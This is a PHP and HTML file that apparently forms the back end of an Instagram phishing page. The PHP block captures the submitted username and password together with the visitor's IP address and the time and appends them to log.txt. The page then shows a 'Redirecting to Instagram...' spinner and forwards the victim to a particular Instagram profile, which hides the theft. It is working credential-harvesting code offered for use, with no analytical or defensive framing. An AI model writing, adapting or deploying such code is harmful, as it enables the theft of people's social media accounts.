<?php
$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$date = date('Y-m-d H:i:s');

$data = "[$date] IP: $ip | IG Username: $username | Password: $password\n";
file_put_contents("log.txt", $data, FILE_APPEND);
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial;
            background: #fafafa;
            margin: 0;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #833ab4;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p { margin-top: 20px; color: #262626; font-size: 18px; }
    </style>
</head>
<body>
    <div style='text-align:center'>
        <div class='loader'></div>
        <p>Redirecting to Instagram...</p>
    </div>
    <script>
        setTimeout(function() {
            window.location.href = 'https://www.instagram.com/ayush_offlcial_?igsh=aDBvZ3NwdXNldTNm';
        }, 2000);
    </script>
</body>
</html>
